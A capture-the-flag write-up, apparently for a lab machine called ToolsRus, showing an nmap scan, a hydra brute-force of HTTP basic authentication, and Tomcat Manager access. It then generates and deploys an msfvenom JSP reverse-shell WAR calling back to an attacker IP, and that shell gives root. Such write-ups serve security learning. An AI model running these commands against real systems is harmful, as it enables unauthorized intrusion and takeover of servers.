# ToolsRus

### ToysRus
Nmap scan shows ports 22, 80,1234 and 8009 open.
    
    PORT     STATE SERVICE VERSION
    22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey: 
    |   2048 58:b3:31:6c:9e:9c:b3:ad:03:7d:c9:f7:73:61:7c:9e (RSA)
    |   256 8b:74:b7:00:25:5d:c4:1d:46:ce:54:7d:ef:ec:d6:60 (ECDSA)
    |_  256 49:a8:10:e7:a9:e7:a0:21:b0:1c:47:db:51:4e:a1:7d (ED25519)
    80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
    |_http-server-header: Apache/2.4.18 (Ubuntu)
    |_http-title: Site doesn't have a title (text/html).
    1234/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
    |_http-favicon: Apache Tomcat
    |_http-title: Apache Tomcat/7.0.88
    |_http-server-header: Apache-Coyote/1.1
    8009/tcp open  ajp13   Apache Jserv (Protocol v1.3)
    |_ajp-methods: Failed to get a valid response for the OPTION request
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Port 80 seems empty:<br />
![image](https://github.com/user-attachments/assets/a411d63e-7e58-4660-b740-60d1bdb08089)<br />
Directory enumeration finds `/protected` which I can't access since it's protected by **basic authentication**, and `/guidelines`, with the following content: <br />
![image](https://github.com/user-attachments/assets/898c4019-2bb5-4040-b856-76b463e7c0bf)<br />
So I try to bruteforce login on the basic authentication on `/protected` with `hydra -l bob -P /usr/share/wordlists/rockyou.txt 10.10.117.89 http-get /protected`. And it finds me the credentials to log in. <br />
![image](https://github.com/user-attachments/assets/aef2ab86-64e7-4f32-b98f-163e8bce4543)<br />
Port 1234 is a default tomcat webpage. I can log into `Manager App` with the previously found credentials. From here I can upload a reverse shell in .war. I'll use msfvenom: `msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.11.85.53 LPORT=9001 -f war > reverse_shell.war`<br />
After the deployment, there's the reverse shell file: <br />
![image](https://github.com/user-attachments/assets/09cf2443-ad30-458a-a04d-f900fec5c8a8)<br />
Now I just open a netcat listener on port 9001 and click on the revese shell. This gives me a shell as root. 
